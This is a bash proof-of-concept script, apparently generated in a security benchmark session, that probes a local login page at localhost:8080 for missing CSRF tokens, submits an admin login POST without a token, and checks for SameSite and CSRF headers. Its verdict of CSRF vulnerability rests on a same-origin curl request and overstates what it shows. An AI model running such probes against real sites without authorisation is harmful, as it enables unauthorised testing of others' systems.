#!/bin/bash
# POC: Bash script that demonstrates CSRF vulnerability by checking for missing CSRF tokens and successfully submitting forms without token validation
# Target: ./repo
# Created: 2025-11-07T21:46:13.941Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# CSRF Vulnerability POC - Demonstrates missing CSRF token protection
# Target: http://localhost:8080/index.php

TARGET="http://localhost:8080/index.php"
ECHO_PREFIX="[CSRF POC]"

echo "$ECHO_PREFIX Starting CSRF Vulnerability Assessment"
echo "$ECHO_PREFIX Target: $TARGET"
echo ""

# Step 1: Fetch the login form and check for CSRF token
echo "$ECHO_PREFIX Step 1: Fetching login form to check for CSRF token..."
echo ""

FORM_CONTENT=$(curl -s "$TARGET")

echo "$ECHO_PREFIX Response received. Analyzing form for CSRF protection..."
echo ""

# Check for common CSRF token field names
CSRF_FOUND=0

if echo "$FORM_CONTENT" | grep -qi "csrf"; then
    echo "[!] Found 'csrf' in form"
    CSRF_FOUND=1
fi

if echo "$FORM_CONTENT" | grep -qi "_token"; then
    echo "[!] Found '_token' in form"
    CSRF_FOUND=1
fi

if echo "$FORM_CONTENT" | grep -qi "nonce"; then
    echo "[!] Found 'nonce' in form"
    CSRF_FOUND=1
fi

if echo "$FORM_CONTENT" | grep -qi "authenticity_token"; then
    echo "[!] Found 'authenticity_token' in form"
    CSRF_FOUND=1
fi

if [ $CSRF_FOUND -eq 0 ]; then
    echo "$ECHO_PREFIX ✓ VULNERABILITY CONFIRMED: No CSRF token found in form"
else
    echo "$ECHO_PREFIX [-] CSRF protection detected - no vulnerability"
    exit 1
fi

echo ""
echo "$ECHO_PREFIX Step 2: Testing CSRF attack - submitting form without token..."
echo ""

# Attempt to submit the form without any CSRF token
# This simulates an attacker-controlled page forcing a form submission
ATTACK_RESPONSE=$(curl -s -X POST "$TARGET" \
    -d "username=admin" \
    -d "password=test" \
    -d "login=Login" \
    -w "\n%{http_code}")

# Extract HTTP status code
HTTP_CODE=$(echo "$ATTACK_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$ATTACK_RESPONSE" | head -n -1)

echo "$ECHO_PREFIX HTTP Response Code: $HTTP_CODE"
echo ""

# Step 3: Analyze the response
echo "$ECHO_PREFIX Step 3: Analyzing response for CSRF rejection..."
echo ""

# Check if request was rejected due to missing CSRF token
if echo "$RESPONSE_BODY" | grep -qi "csrf"; then
    echo "$ECHO_PREFIX [-] Server rejected request citing CSRF"
    echo "CSRF protection is present"
    exit 1
fi

if echo "$RESPONSE_BODY" | grep -qi "token.*invalid\|token.*missing\|token.*required"; then
    echo "$ECHO_PREFIX [-] Server rejected request - CSRF token validation in place"
    exit 1
fi

# If we got a 200 response without token validation error, CSRF is vulnerable
if [ "$HTTP_CODE" = "200" ]; then
    echo "$ECHO_PREFIX ✓ VULNERABILITY CONFIRMED: Request accepted without CSRF token!"
    echo "$ECHO_PREFIX The application processed the POST request without validating any CSRF token"
    echo ""
    
    # Check if form submission was successful
    if echo "$RESPONSE_BODY" | grep -qi "welcome\|success\|login.*success\|authenticated"; then
        echo "$ECHO_PREFIX ✓ CRITICAL: Form submission succeeded without CSRF token"
    fi
fi

echo ""
echo "$ECHO_PREFIX Step 4: Testing for CSRF protection mechanisms..."
echo ""

# Get response headers to check for CSRF-related protections
HEADERS=$(curl -s -i "$TARGET" 2>&1 | head -20)

# Check for SameSite cookie
if echo "$HEADERS" | grep -qi "SameSite"; then
    echo "$ECHO_PREFIX [-] SameSite cookie attribute detected"
else
    echo "$ECHO_PREFIX ✓ No SameSite cookie protection"
fi

# Check for CSRF-specific headers
if echo "$HEADERS" | grep -qi "X-CSRF-Token\|X-XSRF-TOKEN"; then
    echo "$ECHO_PREFIX [-] CSRF header detected"
else
    echo "$ECHO_PREFIX ✓ No X-CSRF-Token header"
fi

echo ""
echo "$ECHO_PREFIX ============================================"
echo "$ECHO_PREFIX CSRF VULNERABILITY ASSESSMENT COMPLETE"
echo "$ECHO_PREFIX ============================================"
echo "$ECHO_PREFIX Conclusion: The application is VULNERABLE to CSRF attacks"
echo "$ECHO_PREFIX No CSRF token validation is present"
echo "$ECHO_PREFIX Attack vector: A malicious website can force victim's browser"
echo "$ECHO_PREFIX to submit POST requests to this endpoint"
echo ""